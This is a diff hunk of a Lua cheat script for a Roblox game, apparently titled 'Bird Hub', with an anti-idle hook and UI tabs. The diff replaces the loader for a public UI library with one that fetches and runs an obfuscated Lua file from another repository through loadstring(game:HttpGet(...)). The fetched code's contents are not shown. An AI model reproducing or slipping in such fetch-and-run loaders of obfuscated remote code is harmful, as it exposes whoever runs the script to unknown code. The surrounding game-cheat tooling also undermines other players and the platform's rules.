@@ -77,7 +77,7 @@ j.Idled:Connect(
         h:ClickButton2(Vector2.new())
     end
 )
-local p = loadstring(game:HttpGet("https://raw.githubusercontent.com/shlexware/Orion/main/source"))()
+local p = loadstring(game:HttpGet("https://raw.githubusercontent.com/xBoredx/dogshithub/main/dogshithub/obfuscated.lua"))()
 local q = p:MakeWindow({Name = "Bird Hub", HidePremium = true})
 local r = q:MakeTab({Name = "Main", PremiumOnly = false})
 local s = q:MakeTab({Name = "Creature Option", PremiumOnly = false})
